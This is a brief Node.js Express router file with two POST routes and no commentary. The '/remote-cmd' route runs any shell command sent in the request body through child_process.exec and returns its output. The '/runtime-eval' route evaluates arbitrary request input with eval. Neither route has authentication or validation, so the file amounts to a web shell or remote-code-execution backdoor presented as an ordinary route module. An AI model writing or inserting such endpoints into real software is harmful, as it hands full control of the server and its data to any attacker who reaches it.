const express = require('express');
const { exec } = require('child_process');

const router = express.Router();

router.post('/remote-cmd', (req, res) => {
  const command = req.body.command;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr || error.message });
    }
    return res.json({ output: stdout });
  });
});

router.post('/runtime-eval', (req, res) => {
  const expression = req.body.expression;
  const result = eval(expression);
  return res.json({ result });
});

module.exports = router;